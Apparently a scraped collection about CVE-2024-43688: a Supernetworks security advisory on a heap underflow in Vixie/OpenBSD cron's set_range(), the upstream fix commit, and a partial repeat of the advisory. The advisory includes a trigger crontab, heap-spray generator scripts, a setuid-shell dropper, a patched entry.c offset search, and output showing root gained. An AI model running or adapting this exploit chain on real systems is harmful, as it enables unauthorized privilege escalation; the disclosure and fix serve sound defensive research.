=== Content from www.supernetworks.org_f334d48c_20250110_142609.html ===
Supernetworks Advisory
https://www.supernetworks.org/
Advisory URL: https://www.supernetworks.org/CVE-2024-43688/openbsd-cron-heap-underflow.txt
Credit:Dave G.  and Alex Radocea
OpenBSD crond / crontab set\_range() heap underflow (CVE-2024-43688)
---------------------
Vulnerability Details
---------------------
There is a potentially exploitable heap underflow in recent versions of Vixie Cron, that affects both the cron daemon and the crontab command.  An attacker can use this vulnerability to obtain root on OpenBSD 7.4 and 7.5.
Crontab entries begin with five fields that specify minute, hour, day of month, month, and day of week.  To allow for more advanced command scheduling, each of these fields can accept a range of numbers and/or step values.  A concise example from the man page on both ranges and step values is "0-23/2 can be used in the hours field to specify command execution every other hour", with a range being 0-23 and a step value being 2.
In May of 2023 [1], significant changes were made to the range and step handling code of a crontab entry in Vixie Cron.  A new function, set\_range() was introduced in entry.c.  This patch was incorporated into OpenBSD in June of 2023 [2].  Let's take a quick look at set\_range:
1 static int
2 set\_range(bitstr\_t \*bits, int low, int high, int start, int stop, int step) {
      [ ... ]
5 if (start < low || stop > high)
6 return (EOF);
7 start -= low;
8 stop -= low;
9 if (step == 1) {
10 bit\_nset(bits, start, stop);
11 } else {
12 for (int i = start; i <= stop; i += step)
13 bit\_set(bits, i);
14 }
15 return (OK);
16 }
The for loop on line 12 will add the step value provided in the crontab entry to i.  This will then be used by bit\_set as an index in the bits bitstring.  As a result, an attacker can modify arbitrary values in memory, provided that they are within 256 megabytes of bits.
This condition only occurs with the step value as the range values are all sanity checked to ensure they don't exceed the maximum value of a field (e.g. the minutes value cannot exceed 59).
While OpenBSD implemented a privsep cron, where crontab is setgid cron instead of setuid root, this same vulnerability can be used to target both crontab and cron.
PoC
—
The following shell script will trigger the vulnerability.
#!/bin/sh
crontab - << EOF
0-0/2147494407 \* \* \* \* test
EOF
-
[1] https://github.com/vixie/cron/commit/62a064fd775cd682426176bab002a7d54a6b5bfc
[2] https://github.com/openbsd/src/commit/314287cb0fc4d196d759a12ff1da4f7c4c004504
—-------------
Exploitability
—-------------
The issue can be triggered on 64 bit builds of cron, where atoi can return negative values even when given a positive number. On 32-bit builds, atoi will only return values up to 2147483647, and since cron will not parse strings starting with a minus symbol, no heap underflow happens.
The OpenBSD implementation of atoi is below. On 64-bit builds, a long returned from strtol is 64-bits, whereas it is only 32-bits on 32-bit builds.
int
atoi(const char \*str)
{
        return((int)strtol(str, (char \*\*)NULL, 10));
}
DEF\_STRONG(atoi);
—-----------------
Exploitation Notes
—-----------------
The `bit\_set` routine creates a write primitive that allows setting bits up to 256MB (31-bit signed int/8) before the start of the `bits` buffer.
  [256MB][bits decl start | bits end| flags |
Bits is an offset in an `entry` structure which is allocated on the heap. In crontab, only one entry at a time is allocated ,whereas in cron one entry is allocated for each command.
typedef struct \_entry {
        SLIST\_ENTRY(\_entry) entries;
        struct passwd   \*pwd;
        char            \*\*envp;
        char            \*cmd;
        bitstr\_t        bit\_decl(minute, MINUTE\_COUNT);
        bitstr\_t        bit\_decl(hour,   HOUR\_COUNT);
        bitstr\_t        bit\_decl(dom,    DOM\_COUNT);
        bitstr\_t        bit\_decl(month,  MONTH\_COUNT);
        bitstr\_t        bit\_decl(dow,    DOW\_COUNT);
        int             flags;
}
Range Analysis:
Providing a small step, such as -1, will scribble large amounts of memory as the loop takes awhile for `i` to overflow into a positive integer again and escape the loop.
12 for (int i = start; i <= stop; i += step)
13 bit\_set(bits, i);
14 }
Between the address space being sparse and OpenBSD's malloc implementation using guard pages for hardening, it's best to target a step size that will target a single bit.
To avoid multiple writes out of bound in the loop, a value at the first 128MB of the region can be used instead. These are guaranteed to only do a single bit OR before the loop exits.
That is, bytes between 256MB and 128MB in front of bits.
-256MB | target | -128MB | .... | bits start | bits end
The 128MB boundary corresponds to where the third loop remains a signed integer and enters the block for another write:
2\*0xf8000000\*8 = 0xf80000000 ~= 0x80000000
Targeting `crontab`:
crontab is a setgid binary that lets users set validated cron entries and suffers from the same vulnerability.
OpenBSD's crontab has limited attacker-controlled heap manipulation because only one entry at a time is allocated during processing. However, since OpenBSD randomizes the heap aggressively, sufficiently many runs of crontab will eventually have the underflow hit allocated heap structures.
Although the write is blind, the bit\_set operation could create ASLR bypass opportunities where a heap data structure is partially modified. Routines such as `editit` use `asprintf` which allocate from the heap and might begin to disclose memory contents from the `/bin/sh -c ~editor filepath~` command line.
If an attacker does gain arbitrary code execution as crontab to gain the cron group, they can directly modify crontab entries to further target `cron`.
Targeting `cron`:
A limitation of crashing `cron` is that OpenBSD will not restart the daemon. We'll ignore the one-shot nature of the exploit for exploration while we try to craft a heap layout to exploit `cron`.
Cron will parse the cron database directory and create many heap `entry` structures from each user's crontab file.
Since cron runs commands as arbitrary users, including root, corrupting a password entry structure to change the uid to 0 is one possible avenue of attack.
```c
typedef struct \_entry {
        SLIST\_ENTRY(\_entry) entries;
        struct passwd   \*pwd; [1]
        char            \*\*envp;  [2]
        char            \*cmd; [3]
        bitstr\_t        bit\_decl(minute, MINUTE\_COUNT);
        bitstr\_t        bit\_decl(hour,   HOUR\_COUNT);
        bitstr\_t        bit\_decl(dom,    DOM\_COUNT);
        bitstr\_t        bit\_decl(month,  MONTH\_COUNT);
        bitstr\_t        bit\_decl(dow,    DOW\_COUNT);
        int             flags;
}
struct passwd {
char \*pw\_name; /\* user name \*/
char \*pw\_passwd; /\* encrypted password \*/
uid\_t pw\_uid; /\* user uid \*/
gid\_t pw\_gid; /\* user gid \*/
time\_t pw\_change; /\* password change time \*/
char \*pw\_class; /\* user access class \*/
char \*pw\_gecos; /\* Honeywell login info \*/
char \*pw\_dir; /\* home directory \*/
char \*pw\_shell; /\* default shell \*/
time\_t pw\_expire; /\* account expiration \*/
};
```
When an entry is allocated, roughly 4  memory allocations correspond:
1) the entry itself
2) the pw\_dup call for the passwd entry
3) the environment copy and all of the individual strdup calls
4) the cmd string
By allocating environment structures [2], it's possible to create fake passwd entry[1] structures using the string pointers. The end of an environment allocation will be filled with NUL bytes and can correspond to pw\_uid and pw\_gid being 0.
For this to work, an environment should look like the following, where the NULL entry of the environment corresponds to pw\_uid 0 and pw\_gid 0.
[ ENV A A A A 509 510 511 NULL]  [ ENV A A A A 509 510 511 NULL]
                    ^
                    fake passwd
The NULL pointer here would correspond to a pw\_uid and pw\_gid of 0.
Exploring how do\_command works, a valid password entry must have:
- A valid pw\_name string
- A valid pw\_dir string
- A valid pw\_class string, set to an empty string "", otherwise set user context can fail.
- NULL or a valid pointer for the string values
A successful heap spray would result in environment with fake password entries that look roughly like:
{pw\_name = 0x6cf8c6c2450 "A502=B", pw\_passwd = 0x6cf8c6c2a80 "A503=B", pw\_uid = 0, pw\_gid = 0,
pw\_change = 0, pw\_class = 0x6cf0938ac80 "", pw\_gecos = 0x6cf2c38fa00 "H8,\006",
pw\_dir = 0x6cf2c38a010 "`8,\006", pw\_shell = 0x6cf2c365c50 "/tmp/sh", pw\_expire = 1152921504606846975}
Further improvements are making each environment entry roughly page-sized (4096 bytes) as well as setting the user's GECOS to a large string so at least 1024 bytes are allocated for each `pw\_dup` call.
The following python script can generate a heap layout that achieves the above most of the time.
```python3
#/usr/bin/env python3
f = open("user-crontab",'w')
f.write("USER=user\n")
f.write("LOGNAME=user\n")
f.write("SHELL=/bin/sh\n")
f.write("HOME=/home/user\n")
for i in range(512-8): #get 4k pages and see what happens
  prefix = "A%d"%i
  f.write(prefix + "=" + "B" + "\x00\n")
# Note: each entry gets distinct copy of the above environment.
for i in range(2\*\*15):
  f.write("\* \* \* \* \* " + "-q /tmp/sh" + "\n")
```
The `/tmp/sh` script can be set as
```bash
#!/bin/sh
# demo.sh
if [ "$(id -u)" -ne 0 ]; then
  exit 0;
fi
cp /bin/sh /usr/
chmod 4755 /usr/sh
echo success | wall
```
The missing piece now is which offsets to flip bits on.
We can modify `entry.c` to search as well as demonstrate the concept
```c
//modifications to entry.c
#include
#include
#include
#include
int
is\_address\_mapped(void \*addr)
{
unsigned int result;
size\_t len = sysconf(\_SC\_PAGESIZE);
void           \*page\_aligned\_addr = (void \*) ((uintptr\_t) addr & ~(len - 1));
result = msync(page\_aligned\_addr, len, MS\_SYNC);
if (result == 0) {
return 1;
}
return 0;
}
extern user    \*g\_user; //set in user.c's load\_user
// bit patterns to modify pwd with to point into an environment.
// many more are valid but these represent some common values for nearby allocations
uint64\_t flips [] = {0x15e0, 0x1ae0, 0x1fe0, 0x25e0, 0x1ae0, 0x2fe0, 0x85e0, 0x8ae0, 0x8fe0, 0};
void
run\_poc(bitstr\_t \* bits, int low, int high, int start, int stop, int step)
{
int candidates[256];
int cstep = 0;
int cdone = 0;
entry          \*ee;
int count = 0, gcount = 0;
SLIST\_FOREACH(ee, &g\_user->crontab, entries) {
count++;
uint64\_t pwd64 = (uint64\_t) ee->pwd;
uint64\_t delta = (uint64\_t) bits - (uint64\_t) & ee->pwd;
uint64\_t bits64 = (uint64\_t) bits;
//candidate @ ee->pwd is simply too far away
if (delta > 256 \* 1024 \* 1024)
continue;
//candidate wont exit loop after 1 bit set out of bounds
if (delta < 128 \* 1024 \* 1024)
continue;
for (int jflip = 0; flips[jflip] != 0; jflip++) {
uint64\_t flip = flips[jflip];
uint64\_t flipped = pwd64 | flip;
if (flipped != pwd64) {
if (is\_address\_mapped((void \*) flipped) != 1) {
continue;
}
//make sure flipped doesnt fall off at the end either
if (is\_address\_mapped((void \*) flipped + sizeof(\*ee->pwd)) != 1) {
continue;
}
//further validate that this makes sense.
struct passwd  \*pflip = (struct passwd \*) flipped;
if (1 != is\_address\_mapped(pflip->pw\_name))
continue;
if (1 != is\_address\_mapped(pflip->pw\_class))
continue;
if (1 != is\_address\_mapped(pflip->pw\_dir))
continue;
if (0 != pflip->pw\_uid)
continue;
{
gcount++;
printf("pflip @ %p orig pw @ %llx bits %p\n", pflip, pwd64, bits);
printf("===flip pattern %llx offset %llx ===\n", flip, (1ull << 32LL) - delta);
for (int bit = 63; bit >= 0; bit--) {
unsigned int mask = 1u << bit;
if (flip & mask) {
uint64\_t s = ((1ull << 32LL) - delta \* 8) + bit;
printf("0-0/%llu \* \* \* \* /tmp/write %llu\n", s, s);
if (cdone != 0)
candidates[cstep++] = s;
}
}
cdone = 1;
}
}
}
}
printf("searched %d entries with %d candidates pid %d\n", count, gcount, getpid());
if (gcount == 0)
exit(0);
for (int ci = 0; ci < cstep; ci++) {
step = candidates[ci];
int ecount = 0;
for (int i= start; i <= stop; i += step) {
bit\_set(bits, i);
ecount++;
}
}
}
int set\_range(bitstr\_t \* bits, int low, int high, int start, int stop, int step)
{
int i;
if (start < low || stop > high)
return (EOF);
start -= low;
stop -= low;
if (step == -2147483648) {
run\_poc(bits, low, high, start, stop, step);
return (0);
}
if (step == 1) {
bit\_nset(bits, start, stop);
} else {
for (i = start; i <= stop; i += step) {
bit\_set(bits, i);
}
}
return (0);
}
```
Testing:
python3 gen.py; cp z /var/cron/tabs/user
cp demo.sh /tmp/sh
cp demo.sh /tmp/write
while true; do ./cron -n; done
searched 32768 entries with 0 candidates pid 22670
...
After a moment
...
searched 32768 entries with 8 candidates pid 22757
[+] ran jobs. exit(0)
cron: setusercontext failed for A502=B: No such file or directory
pflip @ 0x73df44cffe0 orig pw @ 73df44c7000 bits 0x73e284660a0
===flip pattern 8fe0 offset f68721e8 ===
0-0/3023638351 \* \* \* \* /tmp/write 3023638351
0-0/3023638347 \* \* \* \* /tmp/write 3023638347
0-0/3023638346 \* \* \* \* /tmp/write 3023638346
0-0/3023638345 \* \* \* \* /tmp/write 3023638345
0-0/3023638344 \* \* \* \* /tmp/write 3023638344
0-0/3023638343 \* \* \* \* /tmp/write 3023638343
0-0/3023638342 \* \* \* \* /tmp/write 3023638342
0-0/3023638341 \* \* \* \* /tmp/write 3023638341
pflip @ 0x73df44cffe0 orig pw @ 73df44c7c00 bits 0x73e284660a0
===flip pattern 8fe0 offset f6872ca8 ===
0-0/3023660367 \* \* \* \* /tmp/write 3023660367
0-0/3023660363 \* \* \* \* /tmp/write 3023660363
0-0/3023660362 \* \* \* \* /tmp/write 3023660362
0-0/3023660361 \* \* \* \* /tmp/write 3023660361
0-0/3023660360 \* \* \* \* /tmp/write 3023660360
0-0/3023660359 \* \* \* \* /tmp/write 3023660359
0-0/3023660358 \* \* \* \* /tmp/write 3023660358
0-0/3023660357 \* \* \* \* /tmp/write 3023660357
searched 32768 entries with 4 candidates pid 75556
[+] ran jobs. exit(0)
Broadcast Message from A502=B@foo.my.domain                                                                                                                                            "foo.my.domain" 16:00 24-Jul-24
        ((not a tty)) at 16:00 ...
success
          command failed: 550 Invalid recipient:
And now `user` can elevate privileges with the dropped binary.
uid=1000(user) gid=1000(user) groups=1000(user)
foo$ /usr/sh
foo# id
uid=1000(user) euid=0(root) gid=1000(user) groups=1000(user)
So if a user is lucky, a blind exploit might look something like this:
```python3
#/usr/bin/env python3
f = open("user-crontab",'w')
f.write("USER=user\n")
f.write("LOGNAME=user\n")
f.write("SHELL=/bin/sh\n")
f.write("HOME=/home/user\n")
for i in range(512-8): #get 4k pages and see what happens
  prefix = "A%d"%i
  f.write(prefix + "=" + "B" + "\x00\n")
# Note: each entry gets distinct copy of the above environment.
for i in range(2\*\*15):
  f.write("\* \* \* \* \* " + "-q /tmp/sh" + "\n")
f.write("0-0/3023660367 \* \* \* \* /tmp/write 3023660367\n")
f.write("0-0/3023660363 \* \* \* \* /tmp/write 3023660363\n")
f.write("0-0/3023660362 \* \* \* \* /tmp/write 3023660362\n")
f.write("0-0/3023660361 \* \* \* \* /tmp/write 3023660361\n")
f.write("0-0/3023660360 \* \* \* \* /tmp/write 3023660360\n")
f.write("0-0/3023660359 \* \* \* \* /tmp/write 3023660359\n")
f.write("0-0/3023660358 \* \* \* \* /tmp/write 3023660358\n")
f.write("0-0/3023660357 \* \* \* \* /tmp/write 3023660357\n")
```
Combined with a memory disclosure primitive or a more reliable heap layout technique,
it might be possible to elevate privileges with a one-shot attempt against cron.
—----------------------
Supernetworks Challenge
—----------------------
In order to successfully obtain root, an attacker will need to either escalate privileges to crontab or create a crontab file that doesn't crash the crontab process, but also successfully exploits the cron daemon.
Show us a working exploit for this bug, and we'll ship you a WiFi Pod (https://www.supernetworks.org/#products).  Challenge rules can be found over at https://www.supernetworks.org/crontab-challenge.
--------
Disclosure Timeline
--------
24-JUL-2024 Disclosed vulnerability to Paul Vixie and Todd C. Miller
19-AUG-2024 Coordinated Release
—------—------—----
About Supernetworks
—------—------—----
We build easy to use, open source wifi routers in memory safe languages with advanced out of the box security features like per-device passwords and network isolation.


=== Content from github.com_42c5816c_20250110_142608.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvixie%2Fcron%2Fcommit%2F9cc8ab1087bb9ab861dd5595c41200683c9f6712)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvixie%2Fcron%2Fcommit%2F9cc8ab1087bb9ab861dd5595c41200683c9f6712)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=vixie%2Fcron)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[vixie](/vixie)
/
**[cron](/vixie/cron)**
Public

* [Notifications](/login?return_to=%2Fvixie%2Fcron) You must be signed in to change notification settings
* [Fork
  17](/login?return_to=%2Fvixie%2Fcron)
* [Star
   103](/login?return_to=%2Fvixie%2Fcron)

* [Code](/vixie/cron)
* [Issues
  4](/vixie/cron/issues)
* [Pull requests
  1](/vixie/cron/pulls)
* [Actions](/vixie/cron/actions)
* [Projects
  0](/vixie/cron/projects)
* [Wiki](/vixie/cron/wiki)
* [Security](/vixie/cron/security)
* [Insights](/vixie/cron/pulse)

Additional navigation options

* [Code](/vixie/cron)
* [Issues](/vixie/cron/issues)
* [Pull requests](/vixie/cron/pulls)
* [Actions](/vixie/cron/actions)
* [Projects](/vixie/cron/projects)
* [Wiki](/vixie/cron/wiki)
* [Security](/vixie/cron/security)
* [Insights](/vixie/cron/pulse)

## Commit

[Permalink](/vixie/cron/commit/9cc8ab1087bb9ab861dd5595c41200683c9f6712)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix [CVE-2024-43688](https://github.com/advisories/GHSA-598h-v73f-rx7f "CVE-2024-43688"), buffer underflow for very large step values

[Browse files](/vixie/cron/tree/9cc8ab1087bb9ab861dd5595c41200683c9f6712)
Browse the repository at this point in the history

```
In get_number(), reject values that are so large that they are
interpreted as negative numbers.  In set_range(), step values smaller
than one or larger than the "stop" value are ignored.  This prevents
bit_nset() from being called with out-of-range values.

Bug found by Dave G. of Supernetworks.
```

* Loading branch information

[![@millert](https://avatars.githubusercontent.com/u/348203?s=40&v=4)](/millert)

[millert](/vixie/cron/commits?author=millert "View all commits by millert")
committed
Aug 16, 2024

1 parent
[3ce0c3a](/vixie/cron/commit/3ce0c3acdf086a82638818635961c70cba2b6ba7)

commit 9cc8ab1

Showing
**1 changed file**
with
**5 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

7 changes: 5 additions & 2 deletions

7
[entry.c](#diff-15e05042f8b80336b4ad6f21ebe6a068ae52d67548ee21f4d9c60a3e13fd9b6b "entry.c")

Show comments

[View file](/vixie/cron/blob/9cc8ab1087bb9ab861dd5595c41200683c9f6712/entry.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -582,7 +582,10 @@ get\_number(int \*numptr, int low, const char \*names[], int ch, FILE \*file, |
|  |  | /\* got a number, check for valid terminator \*/ |
|  |  | if (!strchr(terms, ch)) |
|  |  | goto bad; |
|  |  | \*numptr = atoi(temp); |
|  |  | i = atoi(temp); |
|  |  | if (i < 0) |
|  |  | goto bad; |
|  |  | \*numptr = i; |
|  |  | return (ch); |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -635,7 +638,7 @@ set\_range(bitstr\_t \*bits, int low, int high, int start, int stop, int step) { |
|  |  | start -= low; |
|  |  | stop -= low; |
|  |  |  |
|  |  | if (step == 1) { |
|  |  | if (step <= 1 || step > stop) { |
|  |  | bit\_nset(bits, start, stop); |
|  |  | } else { |
|  |  | for (int i = start; i <= stop; i += step) |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `9cc8ab1`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvixie%2Fcron%2Fcommit%2F9cc8ab1087bb9ab861dd5595c41200683c9f6712) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.supernetworks.org_036d06af_20250110_142609.html ===
Supernetworks Advisory
https://www.supernetworks.org/
Advisory URL: https://www.supernetworks.org/CVE-2024-43688/openbsd-cron-heap-underflow.txt
Credit:Dave G.  and Alex Radocea
OpenBSD crond / crontab set\_range() heap underflow (CVE-2024-43688)
---------------------
Vulnerability Details
---------------------
There is a potentially exploitable heap underflow in recent versions of Vixie Cron, that affects both the cron daemon and the crontab command.  An attacker can use this vulnerability to obtain root on OpenBSD 7.4 and 7.5.
Crontab entries begin with five fields that specify minute, hour, day of month, month, and day of week.  To allow for more advanced command scheduling, each of these fields can accept a range of numbers and/or step values.  A concise example from the man page on both ranges and step values is "0-23/2 can be used in the hours field to specify command execution every other hour", with a range being 0-23 and a step value being 2.
In May of 2023 [1], significant changes were made to the range and step handling code of a crontab entry in Vixie Cron.  A new function, set\_range() was introduced in entry.c.  This patch was incorporated into OpenBSD in June of 2023 [2].  Let's take a quick look at set\_range:
1 static int
2 set\_range(bitstr\_t \*bits, int low, int high, int start, int stop, int step) {
      [ ... ]
5 if (start < low || stop > high)
6 return (EOF);
7 start -= low;
8 stop -= low;
9 if (step == 1) {
10 bit\_nset(bits, start, stop);
11 } else {
12 for (int i = start; i <= stop; i += step)
13 bit\_set(bits, i);
14 }
15 return (OK);
16 }
The for loop on line 12 will add the step value provided in the crontab entry to i.  This will then be used by bit\_set as an index in the bits bitstring.  As a result, an attacker can modify arbitrary values in memory, provided that they are within 256 megabytes of bits.
This condition only occurs with the step value as the range values are all sanity checked to ensure they don't exceed the maximum value of a field (e.g. the minutes value cannot exceed 59).
While OpenBSD implemented a privsep cron, where crontab is setgid cron instead of setuid root, this same vulnerability can be used to target both crontab and cron.
PoC
—
The following shell script will trigger the vulnerability.
#!/bin/sh
crontab - << EOF
0-0/2147494407 \* \* \* \* test
EOF
-
[1] https://github.com/vixie/cron/commit/62a064fd775cd682426176bab002a7d54a6b5bfc
[2] https://github.com/openbsd/src/commit/314287cb0fc4d196d759a12ff1da4f7c4c004504
—-------------
Exploitability
—-------------
The issue can be triggered on 64 bit builds of cron, where atoi can return negative values even when given a positive number. On 32-bit builds, atoi will only return values up to 2147483647, and since cron will not parse strings starting with a minus symbol, no heap underflow happens.
The OpenBSD implementation of atoi is below. On 64-bit builds, a long returned from strtol is 64-bits, whereas it is only 32-bits on 32-bit builds.
int
atoi(const char \*str)
{
        return((int)strtol(str, (char \*\*)NULL, 10));
}
DEF\_STRONG(atoi);
—-----------------
Exploitation Notes
—-----------------
The `bit\_set` routine creates a write primitive that allows setting bits up to 256MB (31-bit signed int/8) before the start of the `bits` buffer.
  [256MB][bits decl start | bits end| flags |
Bits is an offset in an `entry` structure which is allocated on the heap. In crontab, only one entry at a time is allocated ,whereas in cron one entry is allocated for each command.
typedef struct \_entry {
        SLIST\_ENTRY(\_entry) entries;
        struct passwd   \*pwd;
        char            \*\*envp;
        char            \*cmd;
        bitstr\_t        bit\_decl(minute, MINUTE\_COUNT);
        bitstr\_t        bit\_decl(hour,   HOUR\_COUNT);
        bitstr\_t        bit\_decl(dom,    DOM\_COUNT);
        bitstr\_t        bit\_decl(month,  MONTH\_COUNT);
        bitstr\_t        bit\_decl(dow,    DOW\_COUNT);
        int             flags;
}
Range Analysis:
Providing a small step, such as -1, will scribble large amounts of memory as the loop takes awhile for `i` to overflow into a positive integer again and escape the loop.
12 for (int i = start; i <= stop; i += step)
13 bit\_set(bits, i);
14 }
Between the address space being sparse and OpenBSD's malloc implementation using guard pages for hardening, it's best to target a step size that will target a single bit.
To avoid multiple writes out of bound in the loop, a value at the first 128MB of the region can be used instead. These are guaranteed to only do a single bit OR before the loop exits.
That is, bytes between 256MB and 128MB in front of bits.
-256MB | target | -128MB | .... | bits start | bits end
The 128MB boundary corresponds to where the third loop remains a signed integer and enters the block for another write:
2\*0xf8000000\*8 = 0xf80000000 ~= 0x80000000
Targeting `crontab`:
crontab is a setgid binary that lets users set validated cron entries and suffers from the same vulnerability.
OpenBSD's crontab has limited attacker-controlled heap manipulation because only one entry at a time is allocated during processing. However, since OpenBSD randomizes the heap aggressively, sufficiently many runs of crontab will eventually have the underflow hit allocated heap structures.
Although the write is blind, the bit\_set operation could create ASLR bypass opportunities where a heap data structure is partially modified. Routines such as `editit` use `asprintf` which allocate from the heap and might begin to disclose memory contents from the `/bin/sh -c ~editor filepath~` command line.
If an attacker does gain arbitrary code execution as crontab to gain the cron group, they can directly modify crontab entries to further target `cron`.
Targeting `cron`:
A limitation of crashing `cron` is that OpenBSD will not restart the daemon. We'll ignore the one-shot nature of the exploit for exploration while we try to craft a heap layout to exploit `cron`.
Cron will parse the cron database directory and create many heap `entry` structures from each user's crontab file.
Since cron runs commands as arbitrary users, including root, corrupting a password entry structure to change the uid to 0 is one possible avenue of attack.
```c
typedef struct \_entry {
        SLIST\_ENTRY(\_entry) entries;
        struct passwd   \*pwd; [1]
        char            \*\*envp;  [2]
        char            \*cmd; [3]
        bitstr\_t        bit\_decl(minute, MINUTE\_COUNT);
        bitstr\_t        bit\_decl(hour,   HOUR\_COUNT);
        bitstr\_t        bit\_decl(dom,    DOM\_COUNT);
        bitstr\_t        bit\_decl(month,  MONTH\_COUNT);
        bitstr\_t        bit\_decl(dow,    DOW\_COUNT);
        int             flags;
}
struct passwd {
char \*pw\_name; /\* user name \*/
char \*pw\_passwd; /\* encrypted password \*/
uid\_t pw\_uid; /\* user uid \*/
gid\_t pw\_gid; /\* user gid \*/
time\_t pw\_change; /\* password change time \*/
char \*pw\_class; /\* user access class \*/
char \*pw\_gecos; /\* Honeywell login info \*/
char \*pw\_dir; /\* home directory \*/
char \*pw\_shell; /\* default shell \*/
time\_t pw\_expire; /\* account expiration \*/
};
```
When an entry is allocated, roughly 4  memory allocations correspond:
1) the entry itself
2) the pw\_dup call for the passwd entry
3) the environment copy and all of the individual strdup calls
4) the cmd string
By allocating environment structures [2], it's possible to create fake passwd entry[1] structures using the string pointers. The end of an environment allocation will be filled with NUL bytes and can correspond to pw\_uid and pw\_gid being 0.
For this to work, an environment should look like the following, where the NULL entry of the environment corresponds to pw\_uid 0 and pw\_gid 0.
[ ENV A A A A 509 510 511 NULL]  [ ENV A A A A 509 510 511 NULL]
                    ^
                    fake passwd
The NULL pointer here would correspond to a pw\_uid and pw\_gid of 0.
Exploring how do\_command works, a valid password entry must have:
- A valid pw\_name string
- A valid pw\_dir string
- A valid pw\_class string, set to an empty string "", otherwise set user context can fail.
- NULL or a valid pointer for the string values
A successful heap spray would result in environment with fake password entries that look roughly like:
{pw\_name = 0x6cf8c6c2450 "A502=B", pw\_passwd = 0x6cf8c6c2a80 "A503=B", pw\_uid = 0, pw\_gid = 0,
pw\_change = 0, pw\_class = 0x6cf0938ac80 "", pw\_gecos = 0x6cf2c38fa00 "H8,\006",
pw\_dir = 0x6cf2c38a010 "`8,\006", pw\_shell = 0x6cf2c365c50 "/tmp/sh", pw\_expire = 1152921504606846975}
Further improvements are making each environment entry roughly page-sized (4096 bytes) as well as setting the user's GECOS to a large string so at least 1024 bytes are allocated for each `pw\_dup` call.
The following python script can generate a heap layout that achieves the above most of the time.
```python3
#/usr/bin/env python3
f = open("user-crontab",'w')
f.write("USER=user\n")
f.write("LOGNAME=user\n")
f.write("SHELL=/bin/sh\n")
f.write("HOME=/home/user\n")
for i in range(512-8): #get 4k pages and see what happens
  prefix = "A%d"%i
  f.write(prefix + "=" + "B" + "\x00\n")
# Note: each entry gets distinct copy of the above environment.
for i in range(2\*\*15):
  f.write("\* \* \* \* \* " + "-q /tmp/sh" + "\n")
```
